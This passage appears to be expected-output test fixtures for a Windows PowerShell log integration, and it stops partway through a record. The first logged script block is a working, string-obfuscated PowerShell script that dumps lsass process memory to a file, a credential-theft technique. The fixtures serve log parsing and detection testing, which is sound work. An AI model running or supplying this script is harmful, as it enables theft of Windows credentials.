    {
      "data_stream": "powershell_operational",
      "package": "windows",
      "source": "test/test-events.json-expected.json",
      "sample_event": {
        "@timestamp": "2024-07-10T18:28:55.469Z",
        "ecs": {
          "version": "8.17.0"
        },
        "event": {
          "category": [
            "process"
          ],
          "code": "4104",
          "kind": "event",
          "provider": "Microsoft-Windows-PowerShell",
          "type": [
            "info"
          ]
        },
        "host": {
          "name": "kingslanding"
        },
        "log": {
          "level": "verbose"
        },
        "powershell": {
          "file": {
            "script_block_entropy_bits": 4.9993893466533095,
            "script_block_entropy_normalized": 0.46973699610806635,
            "script_block_hash": "UqkTOrIKrALdr6uz7n5JWUnSHs8=",
            "script_block_id": "d5325f44-dfca-48a1-aa4f-9bfee88c3d48",
            "script_block_length": 1599,
            "script_block_surprisal_stdev": 1.738552715360117,
            "script_block_text": "$DumpFilePath = $PWD\n$WER = [PSObject].Assembly.GetType(((\"{0}{1}\" -f'Sy','st')+(\"{0}{1}\" -f 'em','.M')+'ana'+(\"{1}{0}\" -f 'e','gem')+(\"{0}{1}\"-f 'n',(\"{0}{2}{1}\" -f't.','ma','Auto'))+'ti'+(\"{1}{0}{2}\" -f(\"{2}{0}{1}\" -f 'W','indow','n.'),'o','s')+'E'+'rro'+(\"{0}{1}{2}\"-f'r',(\"{0}{1}\" -f'Rep','o'),'rt')+'ing'))\n$WERNativeMethods = $WER.GetNestedType(('Na'+'tiv'+(\"{0}{2}{1}\" -f 'e','s',(\"{1}{0}\" -f'od','Meth'))), ('Non'+'Pu'+(\"{0}{1}\" -f'bl','ic')))\n$Flags = [Reflection.BindingFlags] ((\"{1}{0}\"-f'P','Non')+(\"{1}{0}\"-f 'li','ub')+'c'+(\"{0}{1}\"-f(\"{1}{0}\" -f'ta',', S'),'tic'))\n$MiniDumpWriteDump = $WERNativeMethods.GetMethod(((\"{0}{1}\"-f'Min','i')+(\"{1}{2}{0}\"-f(\"{0}{1}\" -f'p','Write'),'Du','m')+'D'+'u'+'m'+'p'), $Flags)\n$MiniDumpWithFullMemory = [UInt32] 2\n$la = 'ls'\n$ss = ('a'+'ss')\n$Process = Get-Process $la$ss\n$ProcessId = $Process.Id\n$ProcessName = $Process.Name\n$ProcessHandle = $Process.Handle\n$ProcessFileName = \"$($ProcessName)_$($ProcessId).dmp\"\n$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName\n$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)\n$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,\n                                             $ProcessId,\n                                             $FileStream.SafeFileHandle,\n                                             $MiniDumpWithFullMemory,\n                                             [IntPtr]::Zero,\n                                             [IntPtr]::Zero,\n                                             [IntPtr]::Zero))\n$FileStream.Close()\nGet-ChildItem $ProcessDumpPath",
            "script_block_unique_symbols": 66
          },
          "sequence": 1,
          "total": 1
        },
        "process": {
          "pid": 4696
        },
        "tags": [
          "forwarded"
        ],
        "user": {
          "id": "S-1-5-21-3715621034-4113696668-281506975-1117"
        },
        "winlog": {
          "activity_id": "{fb13c9de-29f7-0001-18e0-13fbf729d601}",
          "channel": "Microsoft-Windows-PowerShell/Operational",
          "computer_name": "kingslanding.sevenkingdoms.local",
          "event_id": "4104",
          "process": {
            "pid": 4696,
            "thread": {
              "id": 11556
            }
          },
          "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
          "provider_name": "Microsoft-Windows-PowerShell",
          "record_id": "3944",
          "user": {
            "identifier": "S-1-5-21-3715621034-4113696668-281506975-1117"
          },
          "version": 1
        }
      }
    },
    {
      "data_stream": "powershell_operational",
      "package": "windows",
      "source": "test/test-events.json-expected.json",
      "sample_event": {
        "@timestamp": "2024-07-10T18:28:55.469Z",
        "ecs": {
          "version": "8.17.0"
        },
        "event": {
          "category": [
            "process"
          ],
          "code": "4104",
          "kind": "event",
          "provider": "Microsoft-Windows-PowerShell",
          "type": [
            "info"
          ]
        },
        "host": {
          "name": "kingslanding"
        },
        "log": {
          "level": "verbose"
        },
        "powershell": {
          "file": {
            "script_block_hash": "iRpj3hL4uNYIp/wsY8M1MshHsLA=",
            "script_block_id": "d5325f44-dfca-48a1-aa4f-9bfee88c3d48",
            "script_block_text": "yMNxE2DF7vFdvaiZP0CVZ5ByJ2gAhXMdK9+usx\n# zVk913qKde1OAuWdv+rndqkAIm8fUlRnr4saSCg7cIbUwCCf116wUJ7EuJDg0vHe\n# yhnCeHnBbyH3RZkHEi2ofmfgnFISJZDdMAeVZGVOh20Jp50XBzqokpPzeZ6zc1/g\n# yILNyiVgE+RPkjnUQshd1f1PMgn3tns2Cz7bJiVUaqEO3n9qRFgy5JuLae6UweGf\n# AeOo3dgLZxikKzYs3hDMaEtJq8IP71cX7QXe6lnMmXU/Hdfz2p897Zd+kU+vZvKI\n# 3cwLfuVQgK2RZ2z+Kc3K3dRPz2rXycK5XCuRZmvGab/WbrZiC7wJQapgBodltMI5\n# GMdFrBg9IeF7/rP4EqVQXeKtevTlZXjpuNhhjuR+2DMt/dWufjXpiW91bo3aH6Ea\n# jOALXmoxgltCp1K7hrS6gmsvj94cLRf50QQ4U8Qwggd6MIIFYqADAgECAgphDpDS\n# AAAAAAADMA0GCSqGSIb3DQEBCwUAMIGIMQswCQYDVQQGEwJVUzETMBEGA1UECBMK\n# V2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDEeMBwGA1UEChMVTWljcm9zb2Z0\n# IENvcnBvcmF0aW9uMTIwMAYDVQQDEylNaWNyb3NvZnQgUm9vdCBDZXJ0aWZpY2F0\n# ZSBBdXRob3JpdHkgMjAxMTAeFw0xMTA3MDgyMDU5MDlaFw0yNjA3MDgyMTA5MDla\n# MH4xCzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpXYXNoaW5ndG9uMRAwDgYDVQQHEwdS\n# ZWRtb25kMR4wHAYDVQQKExVNaWNyb3NvZnQgQ29ycG9yYXRpb24xKDAmBgNVBAMT\n# H01pY3Jvc29mdCBDb2RlIFNpZ25pbmcgUENBIDIwMTEwggIiMA0GCSqGSIb3DQEB\n# AQUAA4ICDwAwggIKAoICAQCr8PpyEBwurdhuqoIQTTS68rZYIZ9CGypr6VpQqrgG\n# OBoESbp/wwwe3TdrxhLYC/A4wpkGsMg51QEUMULTiQ15ZId+lGAkbK+eSZzpaF7S\n# 35tTsgosw6/ZqSuuegmv15ZZymAaBelmdugyUiYSL+erCFDPs0S3XdjELgN1q2jz\n# y23zOlyhFvRGuuA4ZKxuZDV4pqBjDy3TQJP4494HDdVceaVJKecNvqATd76UPe/7\n# 4ytaEB9NViiienLgEjq3SV7Y7e1DkYPZe7J7hhvZPrGMXeiJT4Qa8qEvWeSQOy2u\n# M1jFtz7+MtOzAz2xsq+SOH7SnYAs9U5WkSE1JcM5bmR/U7qcD60ZI4TL9LoDho33\n# X/DQUr+MlIe8wCF0JV8YKLbMJyg4JZg5SjbPfLGSrhwjp6lm7GEfauEoSZ1fiOIl\n# XdMhSz5SxLVXPyQD8NF6Wy/VI+NwXQ9RRnez+ADhvKwCgl/bwBWzvRvUVUvnOaEP\n# 6SNJvBi4RHxF5MHDcnrgcuck379GmcXvwhxX24ON7E1JMKerjt/sW5+v/N2wZuLB\n# l4F77dbtS+dJKacTKKanfWeA5opieF+yL4TXV5xcv3coKPHtbcMojyyPQDdPweGF\n# RInECUzF1KVDL3SV9274eCBYLBNdYJWaPk8zhNqwiBfenk70lrC8RqBsmNLg1oiM\n# CwIDAQABo4IB7TCCAekwEAYJKwYBBAGCNxUBBAMCAQAwHQYDVR0OBBYEFEhuZOVQ\n# BdOCqhc3NyK1bajKdQKVMBkGCSsGAQQBgjcUAgQMHgoAUwB1AGIAQwBBMAsGA1Ud\n# DwQEAwIBhjAPBgNVHRMBAf8EBTADAQH/MB8GA1UdIwQYMBaAFHItOgIxkEO5FAVO\n# 4eqnxzHRI4k0MFoGA1UdHwRTMFEwT6BNoEuGSWh0dHA6Ly9jcmwubWljcm9zb2Z0\n# LmNvbS9wa2kvY3JsL3Byb2R1Y3RzL01pY1Jvb0NlckF1dDIwMTFfMjAxMV8wM18y\n# Mi5jcmwwXgYIKwYBBQUHAQEEUjBQME4GCCsGAQUFBzAChkJodHRwOi8vd3d3Lm1p\n# Y3Jvc29mdC5jb20vcGtpL2NlcnRzL01pY1Jvb0NlckF1dDIwMTFfMjAxMV8wM18y\n# Mi5jcnQwgZ8GA1UdIASBlzCBlDCBkQYJKwYBBAGCNy4DMIGDMD8GCCsGAQUFBwIB\n# FjNodHRwOi8vd3d3Lm1pY3Jvc29mdC5jb20vcGtpb3BzL2RvY3MvcHJpbWFyeWNw\n# cy5odG0wQAYIKwYBBQUHAgIwNB4yIB0ATABlAGcAYQBsAF8AcABvAGwAaQBjAHkA\n# XwBzAHQAYQB0AGUAbQBlAG4AdAAuIB0wDQYJKoZIhvcNAQELBQADggIBAGfyhqWY\n# 4FR5Gi7T2HRnIpsLlhHhY5KZQpZ90nkMkMFlXy4sPvjDctFtg/6+P+gKyju/R6mj\n# 82nbY78iNaWXXWWEkH2LRlBV2AySfNIaSxzzPEKLUtCw/WvjPgcuKZvmPRul1LUd\n# d5Q54ulkyUQ9eHoj8xN9ppB0g430yyYCRirCihC7pKkFDJvtaPpoLpWgKj8qa1hJ\n# Yx8JaW5amJbkg/TAj/NGK978O9C9Ne9uJa7lryft0N3zDq+ZKJeYTQ49C/IIidYf\n# wzIY4vDFLc5bnrRJOQrGCsLGra7lstnbFYhRRVg4MnEnGn+x9Cf43iw6IGmYslmJ\n# aG5vp7d0w0AFBqYBKig+gj8TTWYLwLNN9eGPfxxvFX1Fp3blQCplo8NdUmKGwx1j\n# NpeG39rz+PIWoZon4c2ll9DuXWNB41sHnIc+BncG0QaxdR8UvmFhtfDcxhsEvt9B\n# xw4o7t5lL+yX9qFcltgA1qFGvVnzl6UJS0gQmYAf0AApxbGbpT9Fdx41xtKiop96\n# eiL6SJUfq/tHI4D1nvi/a7dLl+LrdXga7Oo3mXkYS//WsyNodeav+vyL6wuA6mk7\n# r/ww7QRMjt/fdW1jkT3RnVZOT7+AVyKheBEyIXrvQQqxP/uozKRdwaGIm1dxVk5I\n# RcBCyZt2WwqASGv9eZ/BvW1taslScxMNelDNMYIVZzCCFWMCAQEwgZUwfjELMAkG\n# A1UEBhMCVVMxEzARBgNVBAgTCldhc2hpbmd0b24xEDAOBgNVBAcTB1JlZG1vbmQx\n# HjAcBgNVBAoTFU1pY3Jvc29mdCBDb3Jwb3JhdGlvbjEoMCYGA1UEAxMfTWljcm9z\n# b2Z0IENvZGUgU2lnbmluZyBQQ0EgMjAxMQITMwAAAYdyF3IVWUDHCQAAAAABhzAN\n# BglghkgBZQMEAgEFAKCBrjAZBgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgor\n# BgEEAYI3AgELMQ4wDAYKKwYBBAGCNwIBFTAvBgkqhkiG9w0BCQQxIgQgLIu7f8le\n# gQ0ndTd8gyAEe0fnNBrhCsEUfHD+upEyb7owQgYKKwYBBAGCNwIBDDE0MDKgFIAS\n# AE0AaQBjAHIAbwBzAG8AZgB0oRqAGGh0dHA6Ly93d3cubWljcm9zb2Z0LmNvbTAN\n# BgkqhkiG9w0BAQEFAASCAQCWjkfbjU+QuaidvjCSfT9ZWmVRt7eVzD7wasyZEXwC\n# uPWX5GwoR4xPMYzA/ohAElfSdrP6HWH9R+2sdXnUCJK+7w6N9wbB+S9Da0r3UcHj\n# acV7JEftJK6ZwZ9EyebTgHv6Oa0xhuaRh/BINH4OhfIZEy3A2Lg4KhvNMjGKHTi2\n# agmGkKLUqySkyv48c/HCApLbZ3ugNqI06C284kostGCqpuSg6HRDcGPDzZSkT6l4\n# u1veNMmcpeGzd3NTNy5fkt8jQt3OUQ9NmfYN5nxh1BgDB1kyDm5lWMiZqFqlLS9T\n# sG/jgYnqnprYVqTa8rYsSdmn8y1idSkQ1M715PQlOYNuoYIS8TCCEu0GCisGAQQB\n# gjcDAwExghLdMIIS2QYJKoZIhvcNAQcCoIISyjCCEsYCAQMxDzANBglghkgBZQME\n# AgEFADCCAVUGCyqGSIb3DQEJEAEEoIIBRASCAUAwggE8AgEBBgorBgEEAYRZCgMB\n# MDEwDQYJYIZIAWUDBAIBBQAEIOjiV1RbUVB0CleqHpkpsACXwys4XtATfTNyD7Bu\n# Zv+1AgZfYPphXsEYEzIwMjAwOTIyMjIxOTUxLjg2N1owBIACAfSggdSkgdEwgc4x\n# CzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpXYXNoaW5ndG9uMRAwDgYDVQQHEwdSZWRt\n# b25kMR4wHAYDVQQKExVNaWNyb3NvZnQgQ29ycG9yYXRpb24xKTAnBgNVBAsTIE1p\n# Y3Jvc29mdCBPcGVyYXRpb25zIFB1ZXJ0byBSaWNvMSYwJAYDVQQLEx1UaGFsZXMg\n# VFNTIEVTTjowQTU2LUUzMjktNEQ0RDElMCMGA1UEAxMcTWljcm9zb2Z0IFRpbWUt\n# U3RhbXAgU2VydmljZaCCDkQwggT1MIID3aADAgECAhMzAAABJy9uo++RqBmoAAAA\n# AAEnMA0GCSqGSIb3DQEBCwUAMHwxCzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpXYXNo\n# aW5ndG9uMRAwDgYDVQQHEwdSZWRtb25kMR4wHAYDVQQKExVNaWNyb3NvZnQgQ29y\n# cG9yYXRpb24xJjAkBgNVBAMTHU1pY3Jvc29mdCBUaW1lLVN0YW1wIFBDQSAyMDEw\n# MB4XDTE5MTIxOTAxMTQ1OVoXDTIxMDMxNzAxMTQ1OVowgc4xCzAJBgNVBAYTAlVT\n# MRMwEQYDVQQIEwpXYXNoaW5ndG9uMRAwDgYDVQQHEwdSZWRtb25kMR4wHAYDVQQK\n# ExVNaWNyb3NvZnQgQ29ycG9yYXRpb24xKTAnBgNVBAsTIE1pY3Jvc29mdCBPcGVy\n# YXRpb25zIFB1ZXJ0byBSaWNvMSYwJAYDVQQLEx1UaGFsZXMgVFNTIEVTTjowQTU2\n# LUUzMjktNEQ0RDElMCMGA1UEAxMcTWljcm9zb2Z0IFRpbWUtU3RhbXAgU2Vydmlj\n# ZTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPgB3nERnk6fS40vvWeD\n# 3HCgM9Ep4xTIQiPnJXE9E+HkZVtTsPemoOyhfNAyF95E/rUvXOVTUcJFL7Xb16jT\n# KPXONsCWY8DCixSDIiid6xa30TiEWVcIZRwiDlcx29D467OTav5rA1G6TwAEY5rQ\n# jhUHLrOoJgfJfakZq6IHjd+slI0/qlys7QIGakFk2OB6mh/ln/nS8G4kNRK6Do4g\n# xDtnBSFLNfhsSZlRSMDJwFvrZ2FCkaoexd7rKlUNOAAScY411IEqQeI1PwfRm3aW\n# bS8IvAfJPC2Ah2LrtP8sKn5faaU8epexje7vZfcZif/cbxgUKStJzqbdvTBNc93n\n# /Z8CAwEAAaOCARswggEXMB0GA1UdDgQWBBTl9JZVgF85MSRbYlOJXbhY022V8jAf\n# BgNVHSMEGDAWgBTVYzpcijGQ80N7fEYbxTNoWoVtVTBWBgNVHR8ETzBNMEugSaBH\n# hkVodHRwOi8vY3JsLm1pY3Jvc29mdC5jb20vcGtpL2NybC9wcm9kdWN0cy9NaWNU\n# aW1TdGFQQ0FfMjAxMC0wNy0wMS5jcmwwWgYIKwYBBQUHAQEETjBMMEoGCCsGAQUF\n# BzAChj5odHRwOi8vd3d3Lm1pY3Jvc29mdC5jb20vcGtpL2NlcnRzL01pY1RpbVN0\n# YVBDQV8yMDEwLTA3LTAxLmNydDAMBgNVHRMBAf8EAjAAMBMGA1UdJQQMMAoGCCsG\n# AQUFBwMIMA0GCSqGSIb3DQEBCwUAA4IBAQAKyo180VXHBqVnjZwQy7NlzXbo2+W5\n# qfHxR7ANV5RBkRkdGamkwUcDNL+DpHObFPJHa0oTeYKE0Zbl1MvvfS8RtGGdhGYG\n# CJf+BPd/gBCs4+dkZdjvOzNyuVuDPGlqQ5f7HS7iuQ/cCyGHcHYJ0nXVewF2Lk+J\n# lrWykHpTlLwPXmCpNR+gieItPi/UMF2RYTGwojW+yIVwNyMYnjFGUxEX5/DtJjRZ\n# mg7PBHMrENN2DgO6wBelp4ptyH2KK2EsWT+8jFCuoKv+eJby0QD55LN5f8SrUPRn\n# K86fh7aVOfCglQofo5ABZIGiDIrg4JsV4k6p0oBSIFOAcqRAhiH+1spCMIIGcTCC\n# BFmgAwIBAgIKYQmBKgAAAAAAAjANBgkqhkiG9w0BAQsFADCBiDELMAkGA1UEBhMC\n# VVMxEzARBgNVBAgTCldhc2hpbmd0b24xEDAOBgNVBAcTB1JlZG1vbmQxHjAcBgNV\n# BAoTFU1pY3Jvc29mdCBDb3Jwb3JhdGlvbjEyMDAGA1UEAxMpTWljcm9zb2Z0IFJv\n# b3QgQ2VydGlmaWNhdGUgQXV0aG9yaXR5IDIwMTAwHhcNMTAwNzAxMjEzNjU1WhcN\n# MjUwNzAxMjE0NjU1WjB8MQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3Rv\n# bjEQMA4GA1UEBxMHUmVkbW9uZDEeMBwGA1UEChMVTWljcm9zb2Z0IENvcnBvcmF0\n# aW9uMSYwJAYDVQQDEx1NaWNyb3NvZnQgVGltZS1TdGFtcCBQQ0EgMjAxMDCCASIw\n# DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKkdDbx3EYo6IOz8E5f1+n9plGt0\n# VBDVpQoAgoX77XxoSyxfxcPlYcJ2tz5mK1vwFVMnBDEfQRsalR3OCROOfGEwWbEw\n# RA/xYIiEVEMM1024OAizQt2TrNZzMFcmgqNFDdDq9UeBzb8kYDJYYEbyWEeGMoQe\n# dGFnkV+BVLHPk0ySwcSmXdFhE24oxhr5hoC732H8RsEnHSRnEnIaIYqvS2SJUGKx\n# Xf13Hz3wV3WsvYpCTUBR0Q+cBj5nf/VmwAOWRH7v0Ev9buWayrGo8noqCjHw2k4G\n# kbaICDXoeByw6ZnNPOcvRLqn9NxkvaQBwSAJk3jN/LzAyURdXhacAQVPIk0CAwEA\n# AaOCAeYwggHiMBAGCSsGAQQBgjcVAQQDAgEAMB0GA1UdDgQWBBTVYzpcijGQ80N7\n# fEYbxTNoWoVtVTAZBgkrBgEEAYI3FAIEDB4KAFMAdQBiAEMAQTALBgNVHQ8EBAMC\n# AYYwDwYDVR0TAQH/BAUwAwEB/zAfBgNVHSMEGDAWgBTV9lbLj+iiXGJo0T2UkFvX\n# zpoYxDBWBgNVHR8ETzBNMEugSaBHhkVodHRwOi8vY3JsLm1pY3Jvc29mdC5jb20v\n# cGtpL2NybC9wcm9kdWN0cy9NaWNSb29DZXJBdXRfMjAxMC0wNi0yMy5jcmwwWgYI\n# KwYBBQUHAQEETjBMMEoGCCsGAQUFBzAChj5odHRwOi8vd3d3Lm1pY3Jvc29mdC5j\n# b20vcGtpL2NlcnRzL01pY1Jvb0NlckF1dF8yMDEwLTA2LTIzLmNydDCBoAYDVR0g\n# AQH/BIGVMIGSMIGPBgkrBgEEAYI3LgMwgYEwPQYIKwYBBQUHAgEWMWh0dHA6Ly93\n# d3cubWljcm9zb2Z0LmNvbS9QS0kvZG9jcy9DUFMvZGVmYXVsdC5odG0wQAYIKwYB\n# BQUHAgIwNB4yIB0ATABlAGcAYQBsAF8AUABvAGwAaQBjAHkAXwBTAHQAYQB0AGUA\n# bQBlAG4AdAAuIB0wDQYJKoZIhvcNAQELBQADggIBAAfmiFEN4sbgmD+BcQM9naOh\n# IW+z66bM9TG+zwXiqf76V20ZMLPCxWbJat/15/B4vceoniXj+bzta1RXCCtRgkQS\n# +7lTjMz0YBKKdsxAQEGb3FwX/1z5Xhc1mCRWS3TvQhDIr79/xn/yN31aPxzymXlK\n# kVIArzgPF/UveYFl2am1a+THzvbKegBvSzBEJCI8z+0DpZaPWSm8tv0E4XCfMkon\n# /VWvL/625Y4zu2JfmttXQOnxzplmkIz/amJ/3cVKC5Em4jnsGUpxY517IW3DnKOi\n# PPp/fZZqkHimbdLhnPkd/DjYlPTGpQqWhqS9nhquBEKDuLWAmyI4ILUl5WTs9/S/\n# fmNZJQ96LjlXdqJxqgaKD4kWumGnEcua2A5HmoDF0M2n0O99g/DhO3EJ3110mCII\n# YdqwUB5vvfHhAN/nMQekkzr3ZUd46PioSKv33nJ+YWtvd6mBy6cJrDm77MbL2IK0\n# cs0d9LiFAR6A+xuJKlQ5slvayA1VmXqHczsI5pgt6o3gMy4SKfXAL1QnIffIrE7a\n# KLixqduWsqdCosnPGUFN4Ib5KpqjEWYw07t0MkvfY3v1mYovG8chr1m1rtxEPJdQ\n# cdeh0sVV42neV8HR3jDA/czmTfsNv11P6Z0eGTgvvM9YBS7vDaBQNdrvCScc1bN+\n# NR4Iuto229Nfj950iEkSoYIC0jCCAjsCAQEwgfyhgdSkgdEwgc4xCzAJBgNVBAYT\n# AlVTMRMwEQYDVQQIEwpXYXNoaW5ndG9uMRAwDgYDVQQHEwdSZWRtb25kMR4wHAYD\n# VQQKExVNaWNyb3NvZnQgQ29ycG9yYXRpb24xKTAnBgNVBAsTIE1pY3Jvc29mdCBP\n# cGVyYXRpb25zIFB1ZXJ0byBSaWNvMSYwJAYDVQQLEx1UaGFsZXMgVFNTIEVTTjow\n# QTU2LUUzMjktNEQ0RDElMCMGA1UEAxMcTWljcm9zb2Z0IFRpbWUtU3RhbXAgU2Vy\n# dmljZaIjCgEBMAcGBSsOAwIaAxUAs5W4TmyDHMRM7iz6mgGojqvXHzOggYMwgYCk\n# fjB8MQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMH\n# UmVkbW9uZDEeMBwGA1UEChMVTWljcm9zb2Z0IENvcnBvcmF0aW9uMSYwJAYDVQQD\n# Ex1NaWNyb3NvZnQgVGltZS1TdGFtcCBQQ0EgMjAxMDANBgkqhkiG9w0BAQUFAAIF\n# AOMUsu8wIhgPMjAyMDA5MjIyMTI5MTlaGA8yMDIwMDkyMzIxMjkxOVowdzA9Bgor\n# BgEEAYRZCgQBMS8wLTAKAgUA4xSy7wIBADAKAgEAAgIVPgIB/zAHAgEAAgIRtjAK\n# AgUA4xYEbwIBADA2BgorBgEEAYRZCgQCMSgwJjAMBgorBgEEAYRZCgMCoAowCAIB\n# AAIDB6EgoQowCAIBAAIDAYagMA0GCSqGSIb3DQEBBQUAA4GBAEMD4esQRMLwQdhk\n# Co1zgvmclcwl3lYYpk1oMh1ndsU3+97Rt6FV3adS4Hezc/K94oQKjcxtMVzLzQhG\n# agM6XlqB31VD8n2nxVuaWD1yp2jm/0IvfL9nFMHJRhgANMiBdHqvqNrd86c/Kryq\n# sI0Ch0sOx9wg3BozzqQhmdNjf9c6MYIDDTCCAwkCAQEwgZMwfDELMAkGA1UEBhMC\n# VVMxEzARBgNVBAgTCldhc2hpbmd0b24xEDAOBgNVBAcTB1JlZG1vbmQxHjAcBgNV\n# BAoTFU1pY3Jvc29mdCBDb3Jwb3JhdGlvbjEmMCQGA1UEAxMdTWljcm9zb2Z0IFRp\n# bWUtU3RhbXAgUENBIDIwMTACEzMAAAEnL26j75GoGagAAAAAAScwDQYJYIZIAWUD\n# BAIBBQCgggFKMBoGCSqGSIb3DQEJAzENBgsqhkiG9w0BCRABBDAvBgkqhkiG9w0B\n# CQQxIgQg6wLE4god37E/zRxYUqM58DbGQBLJxEvt6c6xU1jsZqYwgfoGCyqGSIb3\n# DQEJEAIvMYHqMIHnMIHkMIG9BCAbkuhLEoYdahb/BUyVszO2VDi6kB3MSaof/+8u\n# 7SM+IjCBmDCBgKR+MHwxCzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpXYXNoaW5ndG9u\n# MRAwDgYDVQQHEwdSZWRtb25kMR4wHAYDVQQKExVNaWNyb3NvZnQgQ29ycG9yYXRp\n# b24xJjAkBgNVBAMTHU1pY3Jvc29mdCBUaW1lLVN0YW1wIFBDQSAyMDEwAhMzAAAB\n# Jy9uo++RqBmoAAAAAAEnMCIEIK4r6N3NISekswMCG1kSBJCCCePrlLDQWbMKz0wt\n# Lj6CMA0GCSqGSIb3DQEBCwUABIIBACY3cZHtQ2k6zfVG4NotND24Zp0mlZAFe4A+\n# BFDISaaIXS86mO142Y9Hkm9rAMBCIJbKB/Yj1yf1gbygqNCoJDHFxZbdmx5XbShg\n# PVfAQl00TuyQ86VYnFJtvdDODUnwuxErAFR1zyiGGBKYtQWhXNRmbhb1kRkWp5Fg\n# s9mwzZUoGI2UzXDtYb6HkjNIOMxCbWW/27YfCBnOkiP2tJMIU79R4xY4vwQeWkKW\n# dgtyHv+d7eBOd1aOi8HvqCstH6x06RC3DsYfZ/NbYSGuZpjSaSDDC7A1KvdPo6ti\n# UYayEGi9iXfqnAv4Iyzo3OWIN2M2iqepP2xwL8Ne2q1ImLpiZF0=\n# SIG # End signature block"
          },
          "sequence": 1,
          "total": 1
        },
        "process": {
          "pid": 4696
        },
        "tags": [
          "forwarded"
        ],
        "user": {
          "id": "S-1-5-21-3715621034-4113696668-281506975-1117"
        },
        "winlog": {
          "activity_id": "{fb13c9de-29f7-0001-18e0-13fbf729d601}",
          "channel": "Microsoft-Windows-PowerShell/Operational",
          "computer_name": "kingslanding.sevenkingdoms.local",
          "event_id": "4104",
          "process": {
            "pid": 4696,
            "thread": {
              "id": 11556
            }
          },
          "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
          "provider_name": "Microsoft-Windows-PowerShell",
          "record_id": "3944",
          "user": {
            "identifier": "S-1-5-21-3715621034-4113696668-281506975-1117"
          },
          "version": 1
        }
      }
    },
    {
      "data_stream": "powershell_operational",
      "package": "windows",
      "source": "test/test-events.json-expected.json",
      "sample_event": {
        "@timestamp": "2023-06-01T05:27:01.247Z",
        "ecs": {
          "version": "8.17.0"
        },
        "event": {
          "action": "Executing Pipeline",
          "category": [
            "process"
          ],
          "code": "4103",
          "kind": "event",
          "provider": "Microsoft-Windows-PowerShell",
          "sequence": 7216833,
          "type": [
            "info"
          ]
        },
        "host": {
          "name": "host.contoso.com"
        },
        "log": {
          "level": "information"
        },
        "message": "CommandInvocation(Get-ItemProperty): \"Get-ItemProperty\"\nParameterBinding(Get-ItemProperty): name=\"Path\"; value=\"hklm:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\"\nParameterBinding(Get-ItemProperty): name=\"Name\"; value=\"Authentication Packages\"\nCommandInvocation(Select-Object): \"Select-Object\"\nParameterBinding(Select-Object): name=\"ExpandProperty\"; value=\"Authentication Packages\"\nParameterBinding(Select-Object): name=\"InputObject\"; value=\"@{Authentication Packages=System.String[]; PSPath=Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa; PSParentPath=Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control; PSChildName=Lsa; PSDrive=HKLM; PSProvider=Microsoft.PowerShell.Core\\Registry}\"\n\n\nContext:\n        Severity = Informational\n        Host Name = OpsMgr PowerShell Host\n        Host Version = 7.0.5000.0\n        Host ID = b0c2607f-a734-4f24-8f75-fb6e7b79d116\n        Host Application = C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\MonitoringHost.exe -Embedding\n        Engine Version = 5.1.17763.3770\n        Runspace ID = 860aba3e-ecbc-48d8-beaa-b5c19b845dfb\n        Pipeline ID = 2\n        Command Name = Get-ItemProperty\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 7213\n        User = CONTOSO\\SYSTEM\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:",
        "powershell": {
          "command": {
            "invocation_details": [
              {
                "related_command": "Get-ItemProperty",
                "type": "CommandInvocation",
                "value": "\"Get-ItemProperty\""
              },
              {
                "name": "\"Path\"",
                "related_command": "Get-ItemProperty",
                "type": "ParameterBinding",
                "value": "\"hklm:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\""
              },
              {
                "name": "\"Name\"",
                "related_command": "Get-ItemProperty",
                "type": "ParameterBinding",
                "value": "\"Authentication Packages\""
              },
              {
                "related_command": "Select-Object",
                "type": "CommandInvocation",
                "value": "\"Select-Object\""
              },
              {
                "name": "\"ExpandProperty\"",
                "related_command": "Select-Object",
                "type": "ParameterBinding",
                "value": "\"Authentication Packages\""
              },
              {
                "name": "\"InputObject\"",
                "related_command": "Select-Object",
                "type": "ParameterBinding",
                "value": "\"@{Authentication Packages=System.String[]; PSPath=Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa; PSParentPath=Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control; PSChildName=Lsa; PSDrive=HKLM; PSProvider=Microsoft.PowerShell.Core\\Registry}\""
              }
            ],
            "name": "Get-ItemProperty",
            "type": "Cmdlet"
          },
          "engine": {
            "version": "5.1.17763.3770"
          },
          "id": "Microsoft.PowerShell",
          "pipeline_id": "2",
          "process": {
            "executable_version": "7.0.5000.0"
          },
          "runspace_id": "9f8ee3e6-561c-4875-a882-a352509348b8"
        },
        "process": {
          "args": [
            "C:\\Program",
            "Files\\Microsoft",
            "Monitoring",
            "Agent\\Agent\\MonitoringHost.exe",
            "-Embedding"
          ],
          "args_count": 5,
          "command_line": "C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\MonitoringHost.exe -Embedding",
          "entity_id": "1c251f62-545d-4d71-901e-b3445e459c2c",
          "pid": 2349,
          "title": "OpsMgr PowerShell Host"
        },
        "related": {
          "hosts": [
